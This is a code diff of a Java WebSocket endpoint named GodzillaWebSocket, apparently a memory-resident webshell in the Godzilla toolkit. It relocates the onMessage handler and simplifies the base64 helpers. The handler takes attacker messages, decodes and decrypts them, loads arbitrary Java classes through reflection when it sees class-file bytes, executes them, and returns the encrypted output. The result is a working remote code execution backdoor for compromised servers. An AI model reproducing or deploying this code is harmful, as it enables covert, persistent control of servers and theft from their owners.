@@ -21,6 +21,27 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
     private Session session;
     private static Class<?> payload;
 
+    @Override
+    public void onMessage(String message) {
+        try {
+            byte[] data = base64Decode(message);
+            data = x(data, false);
+            if (payload == null || (data[0] == -54 && data[1] == -2)) {
+                payload = reflectionDefineClass(data);
+                session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
+            } else {
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f = payload.newInstance();
+                f.equals(arrOut);
+                f.equals(data);
+                f.toString();
+                session.getBasicRemote().sendText(base64Encode(x(arrOut.toByteArray(), true)));
+            }
+        } catch (Throwable e) {
+            e.printStackTrace();
+        }
+    }
+
     public Class<?> reflectionDefineClass(byte[] classBytes) throws Throwable {
         Object unsafe = null;
         Object rawModule = null;
@@ -65,61 +86,34 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
         session.addMessageHandler(this);
     }
 
-    @Override
-    public void onMessage(String message) {
-        try {
-            byte[] data = base64Decode(message);
-            data = x(data, false);
-            if (payload == null || (data[0] == -54 && data[1] == -2)) {
-                payload = reflectionDefineClass(data);
-                session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
-            } else {
-                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                Object f = payload.newInstance();
-                f.equals(arrOut);
-                f.equals(data);
-                f.toString();
-                session.getBasicRemote().sendText(base64Encode(x(arrOut.toByteArray(), true)));
-            }
-        } catch (Throwable e) {
-            e.printStackTrace();
-        }
-    }
-
     @SuppressWarnings("all")
     public static String base64Encode(byte[] bs) throws Exception {
         String value = null;
         Class<?> base64;
         try {
-            base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
+            base64 = Class.forName("java.util.Base64");
             Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Encoder", true, Thread.currentThread().getContextClassLoader());
-                Object encoder = base64.newInstance();
-                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Encoder");
+            Object encoder = base64.newInstance();
+            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
         }
         return value;
     }
 
     @SuppressWarnings("all")
-    public static byte[] base64Decode(String bs) {
+    public static byte[] base64Decode(String bs) throws Exception {
         byte[] value = null;
         Class<?> base64;
         try {
-            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
+            base64 = Class.forName("java.util.Base64");
             Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
             value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
-            } catch (Exception ignored) {
-            }
+            base64 = Class.forName("sun.misc.BASE64Decoder");
+            Object decoder = base64.newInstance();
+            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
         return value;
     }
